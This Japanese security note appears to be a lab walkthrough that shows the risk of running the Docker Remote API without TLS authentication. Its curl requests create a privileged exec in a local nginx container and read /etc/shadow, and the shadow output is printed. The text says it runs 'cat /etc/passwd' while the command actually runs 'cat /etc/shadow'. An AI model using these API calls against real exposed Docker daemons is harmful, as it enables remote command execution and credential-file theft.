# Docker Remote API
Docker Remote APIをTLSクライアント認証を介さずにアクセスできるようにすると危険である。

dockerをtcpソケットでもアクセスできるようオプションを追加して起動する。tcpソケットは外部に公開すると危険なのでlocal loopback(127.0.0.1)のみに限定する。この追加したtcpソケットに対してREST APIで操作可能になる。
```
$ sudo dockerd -H unix:// -H=tcp://127.0.0.1:2376
INFO[2020-08-09T07:12:37.441662973Z] Starting up                                  
WARN[2020-08-09T07:12:37.442234528Z] [!] DON'T BIND ON ANY IP ADDRESS WITHOUT setting --tlsverify IF YOU DON'T KNOW WHAT YOU'RE DOING [!] 
INFO[2020-08-09T07:12:37.444122044Z] parsed scheme: "unix"                         module=grpc
INFO[2020-08-09T07:12:37.444207790Z] scheme "unix" not registered, fallback to default scheme  module=grpc
INFO[2020-08-09T07:12:37.444301053Z] ccResolverWrapper: sending update to cc: {[{unix:///run/containerd/containerd.sock 0  <nil>}] <nil>}  module=grpc
INFO[2020-08-09T07:12:37.444352580Z] ClientConn switching balancer to "pick_first"  module=grpc
INFO[2020-08-09T07:12:37.445537132Z] parsed scheme: "unix"                         module=grpc
INFO[2020-08-09T07:12:37.445600093Z] scheme "unix" not registered, fallback to default scheme  module=grpc
INFO[2020-08-09T07:12:37.445654666Z] ccResolverWrapper: sending update to cc: {[{unix:///run/containerd/containerd.sock 0  <nil>}] <nil>}  module=grpc
INFO[2020-08-09T07:12:37.445725391Z] ClientConn switching balancer to "pick_first"  module=grpc
INFO[2020-08-09T07:12:37.451968858Z] [graphdriver] using prior storage driver: overlay2 
WARN[2020-08-09T07:12:37.455452859Z] Your kernel does not support swap memory limit 
WARN[2020-08-09T07:12:37.455516578Z] Your kernel does not support cgroup rt period 
WARN[2020-08-09T07:12:37.455560160Z] Your kernel does not support cgroup rt runtime 
INFO[2020-08-09T07:12:37.455761344Z] Loading containers: start.                   
INFO[2020-08-09T07:12:37.553302384Z] Default bridge (docker0) is assigned with an IP address 172.17.0.0/16. Daemon option --bip can be used to set a preferred IP address 
INFO[2020-08-09T07:12:37.582587401Z] Loading containers: done.                    
INFO[2020-08-09T07:12:37.602147670Z] Docker daemon                                 commit=48a66213fe graphdriver(s)=overlay2 version=19.03.12
INFO[2020-08-09T07:12:37.603006934Z] Daemon has completed initialization          
INFO[2020-08-09T07:12:37.619269041Z] API listen on 127.0.0.1:2376                 
INFO[2020-08-09T07:12:37.619411271Z] API listen on /var/run/docker.sock 
```

まずコンテナを１つ立ち上げておく。
```
$ docker container ls
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
1d282ec99d03        nginx               "/docker-entrypoint.…"   9 seconds ago       Up 8 seconds        80/tcp              happy_mestorf
```

以下curlコマンドでバージョン情報取得可能。
```
$ curl http://localhost:2376/version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.12","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2020-06-22T15:44:20.000000000+00:00","Experimental":"false","GitCommit":"48a66213fe","GoVersion":"go1.13.10","KernelVersion":"4.4.0-1101-aws","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.13","Details":{"GitCommit":"7ad184331fa3e55e52b890ea95e65ba581ae3429"}},{"Name":"runc","Version":"1.0.0-rc10","Details":{"GitCommit":"dc9208a3303feef5b3839f4323d9beb36df0a9dd"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.12","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"48a66213fe","GoVersion":"go1.13.10","Os":"linux","Arch":"amd64","KernelVersion":"4.4.0-1101-aws","BuildTime":"2020-06-22T15:44:20.000000000+00:00"}
```

以下curlコマンドで起動しているコンテナ情報取得が可能。
```
$ curl http://localhost:2376/containers/json
[{"Id":"1d282ec99d03d2beedc2d77478a4b46d5df8378dc3bfac23da5bf13f17d27480","Names":["/happy_mestorf"],"Image":"nginx","ImageID":"sha256:08393e824c32d456ff69aec72c64d1ab63fecdad060ab0e8d3d42640fc3d64c5","Command":"/docker-entrypoint.sh nginx -g 'daemon off;'","Created":1596957317,"Ports":[{"PrivatePort":80,"Type":"tcp"}],"Labels":{"maintainer":"NGINX Docker Maintainers <docker-maint@nginx.com>"},"State":"running","Status":"Up About a minute","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"9ae3505eeac3a2a381e7f5c53aa9f3dbdc4928ea5788dea65b48803e27ac855e","EndpointID":"391362dc0292840699071c58deb68800f46d77c8f66c29b13ed25eb196bc8c0b","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[]}]
```

コンテナID`1d282ec99d03d2beedc2d77478a4b46d5df8378dc3bfac23da5bf13f17d27480`であるniginxコンテナが１つ起動しているのがわかる。

このnginxコンテナに`cat /etc/passwd`を実行させてみる。まずは以下のcurlコマンドで実行したい`cat /etc/passwd`を登録する。
```
$ curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/shadow"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost:2376/containers/1d282ec99d03d2beedc2d77478a4b46d5df8378dc3bfac23da5bf13f17d27480/exec
HTTP/1.1 201 Created
Api-Version: 1.40
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.12 (linux)
Date: Sun, 09 Aug 2020 07:42:06 GMT
Content-Length: 74

{"Id":"17f0102875c58525c17c5e05a6c2f1a15940de03c4ea98fb860b3064d4548112"}
```

レスポンスに含まれるexec id`17f0102875c58525c17c5e05a6c2f1a15940de03c4ea98fb860b3064d4548112`を指定してコマンドを実行する。
```
$ curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost:2376/exec/17f0102875c58525c17c5e05a6c2f1a15940de03c4ea98fb860b3064d4548112/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.40
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.12 (linux)

root:*:18477:0:99999:7:::
aemon:*:18477:0:99999:7:::
bin:*:18477:0:99999:7:::
sys:*:18477:0:99999:7:::
sync:*:18477:0:99999:7:::
games:*:18477:0:99999:7:::
man:*:18477:0:99999:7:::
lp:*:18477:0:99999:7:::
mail:*:18477:0:99999:7:::
news:*:18477:0:99999:7:::
uucp:*:18477:0:99999:7:::
proxy:*:18477:0:99999:7:::
www-data:*:18477:0:99999:7:::
ackup:*:18477:0:99999:7:::
list:*:18477:0:99999:7:::
irc:*:18477:0:99999:7:::
gnats:*:18477:0:99999:7:::
obody:*:18477:0:99999:7:::
_apt:*:18477:0:99999:7:::
nginx:!:18479:0:99999:7:::
```
